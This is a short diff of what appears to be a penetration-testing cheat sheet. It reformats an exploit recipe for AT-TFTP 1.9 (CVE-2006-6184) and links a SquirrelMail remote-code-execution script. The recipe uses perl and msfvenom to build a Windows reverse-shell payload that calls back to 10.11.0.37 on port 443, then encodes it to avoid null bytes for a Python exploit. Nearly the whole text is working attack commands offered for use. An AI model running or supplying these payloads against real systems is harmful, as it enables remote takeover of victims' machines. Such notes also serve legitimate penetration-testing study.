@@ -203,9 +203,11 @@ You might be able to upload shell in profile-photo.
 https://raw.githubusercontent.com/xl7dev/Exploit/master/SquirrelMail/SquirrelMail_RCE_exploit.sh
 	
 ## - AT-TFTP** <br />
- 1.9 version : https://github.com/brianwrf/cve-2006-6184
- 
-1.perl -e 'print """"\x81\xec\xac\x0d\x00\x00""""' > stackadj
-2.msfvenom -p windows/shell/reverse_nonx_tcp LHOST=10.11.0.37 LPORT=443 R > payload
-3.cat stackadj payload > shellcode
-4. cat shellcode | msfvenom -e x86/shikata_ga_nai -b """"\x00"""" -a x86 --platform win -f python"
+ 1.9 version : ref: https://github.com/brianwrf/cve-2006-6184
+
+```sh
+perl -e 'print ""\x81\xec\xac\x0d\x00\x00""' > stackadj
+msfvenom -p windows/shell/reverse_nonx_tcp LHOST=10.11.0.37 LPORT=443 R > payload
+cat stackadj payload > shellcode
+cat shellcode | msfvenom -e x86/shikata_ga_nai -b ""\x00"" -a x86 --platform win -f python
+```sh
